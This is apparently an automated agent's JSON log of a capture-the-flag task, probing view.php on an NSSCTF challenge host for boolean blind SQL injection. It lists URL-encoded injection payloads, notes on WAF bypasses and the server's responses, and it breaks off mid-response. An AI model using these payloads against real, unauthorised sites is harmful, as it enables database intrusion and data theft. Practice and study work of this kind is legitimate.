@@ -1,0 +1,151 @@
+{
+  "cycle": 3,
+  "task_key": "b6726fe349170899",
+  "result": {
+    "task_key": "b6726fe349170899",
+    "task_title": "测试view.php的SQL注入",
+    "completed": false,
+    "rounds_used": 10,
+    "termination_reason": "max_rounds",
+    "phase_summary": "上一轮确认了布尔盲注的存在：no=1 between 2 and 1 返回错误（无结果），no=1 between 1 and 1 返回正常数据。但UNION SELECT被WAF拦截。本轮需进一步测试基本条件（and 1=1、select、substr等）是否可用，以确定盲注提取方案。",
+    "task_summary": "已确认布尔盲注存在，但尚未提取有效数据。需要验证基本SQL函数是否被WAF拦截，然后进行盲注提取。",
+    "task_findings": [
+      "view.php?no参数存在布尔盲注：条件真时返回用户数据，条件假时触发Fatal error",
+      "UNION SELECT被WAF拦截（返回'no hack ~_~'）",
+      "BETWEEN关键字未被拦截"
+    ],
+    "flag_candidates": [],
+    "credentials": [],
+    "latest_execution": {
+      "success": true,
+      "batch_status": "full_success",
+      "summary": "[test_and_1] <!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor...\n[test_and_2] <!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor...\n[test_select] <!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor...\n[test_substr] <!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor...",
+      "findings": [
+        "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor..."
+      ],
+      "stdout": "[test_and_1]\n<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n    <table class=\"table\">\r\n        <tr>\r\n            <th>\r\n                username\r\n            </th>\r\n            <th>\r\n                age\r\n            </th>\r\n            <th>\r\n                blog\r\n            </th>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n                testuser123            </td>\r\n            <td>\r\n                25            </td>\r\n            <td>\r\n                http://example.com            </td>\r\n        </tr>\r\n    </table>\r\n\r\n    <hr>\r\n    <br><br><br><br><br>\r\n    <p>the contents of his/her blog</p>\r\n    <hr>\r\n    <iframe width='100%' height='10em' src='data:text/html;base64,PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj48c3R5bGU+Ym9keXtiYWNrZ3JvdW5kOiNlZWU7d2lkdGg6NjB2dzttYXJnaW46MTV2aCBhdXRvO2ZvbnQtZmFtaWx5OnN5c3RlbS11aSxzYW5zLXNlcmlmfWgxe2ZvbnQtc2l6ZToxLjVlbX1kaXZ7b3BhY2l0eTowLjh9YTpsaW5rLGE6dmlzaXRlZHtjb2xvcjojMzQ4fTwvc3R5bGU+PC9oZWFkPjxib2R5PjxkaXY+PGgxPkV4YW1wbGUgRG9tYWluPC9oMT48cD5UaGlzIGRvbWFpbiBpcyBmb3IgdXNlIGluIGRvY3VtZW50YXRpb24gZXhhbXBsZXMgd2l0aG91dCBuZWVkaW5nIHBlcm1pc3Npb24uIEF2b2lkIHVzZSBpbiBvcGVyYXRpb25zLjwvcD48cD48YSBocmVmPSJodHRwczovL2lhbmEub3JnL2RvbWFpbnMvZXhhbXBsZSI+TGVhcm4gbW9yZTwvYT48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4K'>\r\n</div>\r\n</body>\r\n</html>\n\n[test_and_2]\n<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n    <table class=\"table\">\r\n        <tr>\r\n            <th>\r\n                username\r\n            </th>\r\n            <th>\r\n                age\r\n            </th>\r\n            <th>\r\n                blog\r\n            </th>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n                            </td>\r\n            <td>\r\n                <br />\n<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/view.php</b> on line <b>53</b><br />\n            </td>\r\n            <td>\r\n                <br />\n<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/view.php</b> on line <b>56</b><br />\n            </td>\r\n        </tr>\r\n    </table>\r\n\r\n    <hr>\r\n    <br><br><br><br><br>\r\n    <p>the contents of his/her blog</p>\r\n    <hr>\r\n    <br />\n<b>Fatal error</b>:  Call to a member function getBlogContents() on boolean in <b>/var/www/html/view.php</b> on line <b>67</b><br />\n\n\n[test_select]\n<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n    <table class=\"table\">\r\n        <tr>\r\n            <th>\r\n                username\r\n            </th>\r\n            <th>\r\n                age\r\n            </th>\r\n            <th>\r\n                blog\r\n            </th>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n                testuser123            </td>\r\n            <td>\r\n                25            </td>\r\n            <td>\r\n                http://example.com            </td>\r\n        </tr>\r\n    </table>\r\n\r\n    <hr>\r\n    <br><br><br><br><br>\r\n    <p>the contents of his/her blog</p>\r\n    <hr>\r\n    <iframe width='100%' height='10em' src='data:text/html;base64,PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj48c3R5bGU+Ym9keXtiYWNrZ3JvdW5kOiNlZWU7d2lkdGg6NjB2dzttYXJnaW46MTV2aCBhdXRvO2ZvbnQtZmFtaWx5OnN5c3RlbS11aSxzYW5zLXNlcmlmfWgxe2ZvbnQtc2l6ZToxLjVlbX1kaXZ7b3BhY2l0eTowLjh9YTpsaW5rLGE6dmlzaXRlZHtjb2xvcjojMzQ4fTwvc3R5bGU+PC9oZWFkPjxib2R5PjxkaXY+PGgxPkV4YW1wbGUgRG9tYWluPC9oMT48cD5UaGlzIGRvbWFpbiBpcyBmb3IgdXNlIGluIGRvY3VtZW50YXRpb24gZXhhbXBsZXMgd2l0aG91dCBuZWVkaW5nIHBlcm1pc3Npb24uIEF2b2lkIHVzZSBpbiBvcGVyYXRpb25zLjwvcD48cD48YSBocmVmPSJodHRwczovL2lhbmEub3JnL2RvbWFpbnMvZXhhbXBsZSI+TGVhcm4gbW9yZTwvYT48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4K'>\r\n</div>\r\n</body>\r\n</html>\n\n[test_substr]\n<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n    <table class=\"table\">\r\n        <tr>\r\n            <th>\r\n                username\r\n            </th>\r\n            <th>\r\n                age\r\n            </th>\r\n            <th>\r\n                blog\r\n            </th>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n                testuser123            </td>\r\n            <td>\r\n                25            </td>\r\n            <td>\r\n                http://example.com            </td>\r\n        </tr>\r\n    </table>\r\n\r\n    <hr>\r\n    <br><br><br><br><br>\r\n    <p>the contents of his/her blog</p>\r\n    <hr>\r\n    <iframe width='100%' height='10em' src='data:text/html;base64,PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj48c3R5bGU+Ym9keXtiYWNrZ3JvdW5kOiNlZWU7d2lkdGg6NjB2dzttYXJnaW46MTV2aCBhdXRvO2ZvbnQtZmFtaWx5OnN5c3RlbS11aSxzYW5zLXNlcmlmfWgxe2ZvbnQtc2l6ZToxLjVlbX1kaXZ7b3BhY2l0eTowLjh9YTpsaW5rLGE6dmlzaXRlZHtjb2xvcjojMzQ4fTwvc3R5bGU+PC9oZWFkPjxib2R5PjxkaXY+PGgxPkV4YW1wbGUgRG9tYWluPC9oMT48cD5UaGlzIGRvbWFpbiBpcyBmb3IgdXNlIGluIGRvY3VtZW50YXRpb24gZXhhbXBsZXMgd2l0aG91dCBuZWVkaW5nIHBlcm1pc3Npb24uIEF2b2lkIHVzZSBpbiBvcGVyYXRpb25zLjwvcD48cD48YSBocmVmPSJodHRwczovL2lhbmEub3JnL2RvbWFpbnMvZXhhbXBsZSI+TGVhcm4gbW9yZTwvYT48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4K'>\r\n</div>\r\n</body>\r\n</html>",
+      "stderr": "",
+      "command": "[test_and_1] http_request {\"url\": \"http://node4.anna.nssctf.cn:24052/view.php?no=1%20and%201=1\", \"method\": \"GET\", \"timeout\": 10}\n[test_and_2] http_request {\"url\": \"http://node4.anna.nssctf.cn:24052/view.php?no=1%20and%201=2\", \"method\": \"GET\", \"timeout\": 10}\n[test_select] http_request {\"url\": \"http://node4.anna.nssctf.cn:24052/view.php?no=1%20and%20(select%201)=1\", \"method\": \"GET\", \"timeout\": 10}\n[test_substr] http_request {\"url\": \"http://node4.anna.nssctf.cn:24052/view.php?no=1%20and%20substr('abc',1,1)='a'\", \"method\": \"GET\", \"timeout\": 10}",
+      "source": "strategy",
+      "failure_stage": "",
+      "task_results": {
+        "test_and_1": {
+          "task_id": "test_and_1",
+          "kind": "tool",
+          "tool_name": "http_request",
+          "success": true,
+          "summary": "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor...",
+          "findings": [
+            "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor..."
+          ],
+          "flag_candidates": [],
+          "artifacts": [],
+          "stdout": "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n    <table class=\"table\">\r\n        <tr>\r\n            <th>\r\n                username\r\n            </th>\r\n            <th>\r\n                age\r\n            </th>\r\n            <th>\r\n                blog\r\n            </th>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n                testuser123            </td>\r\n            <td>\r\n                25            </td>\r\n            <td>\r\n                http://example.com            </td>\r\n        </tr>\r\n    </table>\r\n\r\n    <hr>\r\n    <br><br><br><br><br>\r\n    <p>the contents of his/her blog</p>\r\n    <hr>\r\n    <iframe width='100%' height='10em' src='data:text/html;base64,PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj48c3R5bGU+Ym9keXtiYWNrZ3JvdW5kOiNlZWU7d2lkdGg6NjB2dzttYXJnaW46MTV2aCBhdXRvO2ZvbnQtZmFtaWx5OnN5c3RlbS11aSxzYW5zLXNlcmlmfWgxe2ZvbnQtc2l6ZToxLjVlbX1kaXZ7b3BhY2l0eTowLjh9YTpsaW5rLGE6dmlzaXRlZHtjb2xvcjojMzQ4fTwvc3R5bGU+PC9oZWFkPjxib2R5PjxkaXY+PGgxPkV4YW1wbGUgRG9tYWluPC9oMT48cD5UaGlzIGRvbWFpbiBpcyBmb3IgdXNlIGluIGRvY3VtZW50YXRpb24gZXhhbXBsZXMgd2l0aG91dCBuZWVkaW5nIHBlcm1pc3Npb24uIEF2b2lkIHVzZSBpbiBvcGVyYXRpb25zLjwvcD48cD48YSBocmVmPSJodHRwczovL2lhbmEub3JnL2RvbWFpbnMvZXhhbXBsZSI+TGVhcm4gbW9yZTwvYT48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4K'>\r\n</div>\r\n</body>\r\n</html>",
+          "stderr": "",
+          "exit_code": 0,
+          "command": "http_request {\"url\": \"http://node4.anna.nssctf.cn:24052/view.php?no=1%20and%201=1\", \"method\": \"GET\", \"timeout\": 10}",
+          "script_path": "",
+          "source": "strategy:0.61s",
+          "failure_stage": ""
+        },
+        "test_and_2": {
+          "task_id": "test_and_2",
+          "kind": "tool",
+          "tool_name": "http_request",
+          "success": true,
+          "summary": "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor...",
+          "findings": [
+            "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor..."
+          ],
+          "flag_candidates": [],
+          "artifacts": [],
+          "stdout": "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n    <table class=\"table\">\r\n        <tr>\r\n            <th>\r\n                username\r\n            </th>\r\n            <th>\r\n                age\r\n            </th>\r\n            <th>\r\n                blog\r\n            </th>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n                            </td>\r\n            <td>\r\n                <br />\n<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/view.php</b> on line <b>53</b><br />\n            </td>\r\n            <td>\r\n                <br />\n<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/view.php</b> on line <b>56</b><br />\n            </td>\r\n        </tr>\r\n    </table>\r\n\r\n    <hr>\r\n    <br><br><br><br><br>\r\n    <p>the contents of his/her blog</p>\r\n    <hr>\r\n    <br />\n<b>Fatal error</b>:  Call to a member function getBlogContents() on boolean in <b>/var/www/html/view.php</b> on line <b>67</b><br />\n",
+          "stderr": "",
+          "exit_code": 0,
+          "command": "http_request {\"url\": \"http://node4.anna.nssctf.cn:24052/view.php?no=1%20and%201=2\", \"method\": \"GET\", \"timeout\": 10}",
+          "script_path": "",
+          "source": "strategy:3.18s",
+          "failure_stage": ""
+        },
+        "test_select": {
+          "task_id": "test_select",
+          "kind": "tool",
+          "tool_name": "http_request",
+          "success": true,
+          "summary": "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor...",
+          "findings": [
+            "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor..."
+          ],
+          "flag_candidates": [],
+          "artifacts": [],
+          "stdout": "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n    <table class=\"table\">\r\n        <tr>\r\n            <th>\r\n                username\r\n            </th>\r\n            <th>\r\n                age\r\n            </th>\r\n            <th>\r\n                blog\r\n            </th>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n                testuser123            </td>\r\n            <td>\r\n                25            </td>\r\n            <td>\r\n                http://example.com            </td>\r\n        </tr>\r\n    </table>\r\n\r\n    <hr>\r\n    <br><br><br><br><br>\r\n    <p>the contents of his/her blog</p>\r\n    <hr>\r\n    <iframe width='100%' height='10em' src='data:text/html;base64,PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU+PG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj48c3R5bGU+Ym9keXtiYWNrZ3JvdW5kOiNlZWU7d2lkdGg6NjB2dzttYXJnaW46MTV2aCBhdXRvO2ZvbnQtZmFtaWx5OnN5c3RlbS11aSxzYW5zLXNlcmlmfWgxe2ZvbnQtc2l6ZToxLjVlbX1kaXZ7b3BhY2l0eTowLjh9YTpsaW5rLGE6dmlzaXRlZHtjb2xvcjojMzQ4fTwvc3R5bGU+PC9oZWFkPjxib2R5PjxkaXY+PGgxPkV4YW1wbGUgRG9tYWluPC9oMT48cD5UaGlzIGRvbWFpbiBpcyBmb3IgdXNlIGluIGRvY3VtZW50YXRpb24gZXhhbXBsZXMgd2l0aG91dCBuZWVkaW5nIHBlcm1pc3Npb24uIEF2b2lkIHVzZSBpbiBvcGVyYXRpb25zLjwvcD48cD48YSBocmVmPSJodHRwczovL2lhbmEub3JnL2RvbWFpbnMvZXhhbXBsZSI+TGVhcm4gbW9yZTwvYT48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4K'>\r\n</div>\r\n</body>\r\n</html>",
+          "stderr": "",
+          "exit_code": 0,
+          "command": "http_request {\"url\": \"http://node4.anna.nssctf.cn:24052/view.php?no=1%20and%20(select%201)=1\", \"method\": \"GET\", \"timeout\": 10}",
+          "script_path": "",
+          "source": "strategy:5.69s",
+          "failure_stage": ""
+        },
+        "test_substr": {
+          "task_id": "test_substr",
+          "kind": "tool",
+          "tool_name": "http_request",
+          "success": true,
+          "summary": "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor...",
+          "findings": [
+            "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossor..."
+          ],
+          "flag_candidates": [],
+          "artifacts": [],
+          "stdout": "<!doctype html>\r\n<html lang=\"ko\">\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta name=\"viewport\"\r\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\r\n    <title>User</title>\r\n\r\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\r\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\r\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\r\n</head>\r\n<body>\r\n<div class=\"container\">\r\n    <table class=\"table\">\r\n        <tr>\r\n            <th>\r\n                username\r\n            </th>\r\n            <th>\r\n                age\r\n            </th>\r\n            <th>\r\n                blog\r\n            </th>\r\n        </tr>\r\n        <tr>\r\n            <td>\r\n                testuser123            </td>\r\n            <td>\r\n                25            </td>\r\n            <td>\r\n                http://example.com            </td>\r\n        </tr>\r\n    </table>\r\n\r\n    <hr>\r\n    <br><br><br><br><br>\r\n    <p>the contents of his/her blog</p>\r\n    <hr>\r\n    <iframe width='100%' height='10em' 